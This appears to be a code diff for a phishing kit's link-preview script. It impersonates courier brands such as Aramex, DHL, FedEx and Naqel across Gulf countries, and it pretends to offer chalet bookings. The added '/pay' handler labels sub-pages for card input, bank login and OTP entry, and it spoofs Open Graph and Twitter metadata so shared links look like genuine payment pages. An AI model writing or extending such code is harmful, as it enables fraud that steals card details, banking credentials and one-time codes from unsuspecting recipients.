@@ -77,13 +77,33 @@
         ogImage: "/og-aramex.jpg"
       },
       dhl: {
-        name: "دي إتش إل - DHL", 
+        name: "دي إتش إل - DHL",
+        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+        ogImage: "/og-dhl.jpg"
+      },
+      dhlkw: {
+        name: "دي إتش إل - DHL الكويت",
+        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+        ogImage: "/og-dhl.jpg"
+      },
+      dhlqa: {
+        name: "دي إتش إل - DHL قطر",
+        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+        ogImage: "/og-dhl.jpg"
+      },
+      dhlom: {
+        name: "دي إتش إل - DHL عُمان",
+        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+        ogImage: "/og-dhl.jpg"
+      },
+      dhlbh: {
+        name: "دي إتش إل - DHL البحرين",
         description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
         ogImage: "/og-dhl.jpg"
       },
       fedex: {
         name: "فيديكس - FedEx",
-        description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
+        description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات",
         ogImage: "/og-fedex.jpg"
       },
       ups: {
@@ -107,7 +127,7 @@
         ogImage: "/og-zajil.jpg"
       },
       naqel: {
-        name: "ناقل - Naqel", 
+        name: "ناقل - Naqel",
         description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
         ogImage: "/og-naqel.jpg"
       },
@@ -151,65 +171,123 @@
     function updateMetaTags() {
       const url = new URL(window.location.href);
       const path = url.pathname;
-      
+
+      // Check if this is a payment route: /pay/:id/*
+      const payMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)(?:\/(.+))?$/);
+      if (payMatch) {
+        const [, id, subPath] = payMatch;
+        const serviceKey = url.searchParams.get('service') || 'aramex';
+
+        // Normalize service key
+        const normalizedKey = serviceKey.toLowerCase().replace(/[^a-z0-9]/g, '');
+        const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;
+
+        const serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;
+        const serviceName = url.searchParams.get('service_name') || serviceInfo.name || 'خدمة الشحن';
+
+        let pageType = 'صفحة دفع آمنة';
+        if (subPath) {
+          if (subPath.includes('recipient')) pageType = 'معلومات المستلم';
+          else if (subPath.includes('details')) pageType = 'تفاصيل الدفع';
+          else if (subPath.includes('card-input')) pageType = 'بيانات البطاقة';
+          else if (subPath.includes('bank-login')) pageType = 'تسجيل الدخول';
+          else if (subPath.includes('otp')) pageType = 'رمز التحقق';
+        }
+
+        const title = `${serviceName} - ${pageType}`;
+        const description = serviceInfo.description || `صفحة دفع آمنة لخدمة ${serviceName}`;
+        const ogImage = serviceInfo.ogImage || "/og-aramex.jpg";
+
+        const siteUrl = `${url.protocol}//${url.host}`;
+        const fullUrl = url.href;
+        const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
+
+        // Update meta tags
+        document.getElementById('page-title').textContent = title;
+        document.getElementById('page-description').setAttribute('content', description);
+        document.getElementById('og-url').setAttribute('content', fullUrl);
+        document.getElementById('og-title').setAttribute('content', title);
+        document.getElementById('og-description').setAttribute('content', description);
+        document.getElementById('og-image').setAttribute('content', fullOgImage);
+        document.getElementById('twitter-url').setAttribute('content', fullUrl);
+        document.getElementById('twitter-title').setAttribute('content', title);
+        document.getElementById('twitter-description').setAttribute('content', description);
+        document.getElementById('twitter-image').setAttribute('content', fullOgImage);
+        document.getElementById('twitter-image-alt').setAttribute('content', title);
+        document.getElementById('canonical-url').setAttribute('href', fullUrl);
+
+        // Redirect to actual payment page after a short delay to ensure meta tags are processed
+        setTimeout(() => {
+          window.location.href = fullUrl;
+        }, 1000);
+        return;
+      }
+
       // Check if this is a microsite route: /r/:country/:type/:id
       const micrositeMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
-      
-      if (!micrositeMatch) {
-        // Not a microsite route, redirect to main app
-        window.location.href = '/';
+
+      if (micrositeMatch) {
+        const [, countryCode, type, id] = micrositeMatch;
+        const country = countryData[countryCode];
+
+        if (!country) {
+          window.location.href = '/';
+          return;
+        }
+
+        let title = "";
+        let description = "";
+        let ogImage = "/og-aramex.jpg";
+
+        if (type === "shipping") {
+          // For shipping, try to get service info from URL parameters or use default
+          const serviceKey = url.searchParams.get('service') || 'aramex';
+          const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
+
+          // Ensure serviceInfo and its properties exist
+          if (serviceInfo && serviceInfo.name && serviceInfo.description && serviceInfo.ogImage) {
+            title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
+            description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+            ogImage = serviceInfo.ogImage;
+          } else {
+            // Use default values if serviceInfo is invalid
+            title = "تتبع وتأكيد الدفع - منصة الشحن الذكية";
+            description = "تتبع شحنتك وأكمل الدفع بشكل آمن عبر منصة الشحن الذكية";
+            ogImage = "/og-aramex.jpg";
+          }
+        } else if (type === "chalet") {
+          // For chalet links
+          title = `حجز شاليه في ${country.nameAr}`;
+          description = `احجز شاليه أحلامك في ${country.nameAr} - نظام دفع آمن ومحمي`;
+          ogImage = "/og-aramex.jpg";
+        }
+
+        const siteUrl = `${url.protocol}//${url.host}`;
+        const fullUrl = url.href;
+        const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
+        updateTags(title, description, fullOgImage, fullUrl);
+
+        setTimeout(() => window.location.href = fullUrl, 1000);
         return;
       }
-      
-      const [, countryCode, type, id] = micrositeMatch;
-      const country = countryData[countryCode];
-      
-      if (!country) {
-        window.location.href = '/';
-        return;
-      }
-      
-      let title = "";
-      let description = "";
-      let ogImage = "/og-aramex.jpg";
-      
-      if (type === "shipping") {
-        // For shipping, try to get service info from URL parameters or use default
-        const serviceKey = url.searchParams.get('service') || 'aramex';
-        const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-        
-        title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
-        description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
-        ogImage = serviceInfo.ogImage;
-      } else if (type === "chalet") {
-        // For chalet links
-        title = `حجز شاليه في ${country.nameAr}`;
-        description = `احجز شاليه أحلامك في ${country.nameAr} - نظام دفع آمن ومحمي`;
-        ogImage = "/og-aramex.jpg";
-      }
-      
-      const siteUrl = `${url.protocol}//${url.host}`;
-      const fullUrl = url.href;
-      const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
-      
-      // Update meta tags
+
+      // Not a recognized route, redirect to main app
+      window.location.href = '/';
+    }
+
+    function updateTags(title, description, ogImage, fullUrl) {
       document.getElementById('page-title').textContent = title;
       document.getElementById('page-description').setAttribute('content', description);
       document.getElementById('og-url').setAttribute('content', fullUrl);
       document.getElementById('og-title').setAttribute('content', title);
       document.getElementById('og-description').setAttribute('content', description);
-      document.getElementById('og-image').setAttribute('content', fullOgImage);
+      document.getElementById('og-image').setAttribute('content', ogImage);
       document.getElementById('twitter-url').setAttribute('content', fullUrl);
       document.getElementById('twitter-title').setAttribute('content', title);
       document.getElementById('twitter-description').setAttribute('content', description);
-      document.getElementById('twitter-image').setAttribute('content', fullOgImage);
+      document.getElementById('twitter-image').setAttribute('content', ogImage);
       document.getElementById('twitter-image-alt').setAttribute('content', title);
       document.getElementById('canonical-url').setAttribute('href', fullUrl);
-      
-      // Redirect to actual app after a short delay to ensure meta tags are processed
-      setTimeout(() => {
-        window.location.href = fullUrl;
-      }, 1000);
     }
 
     // Run on page load
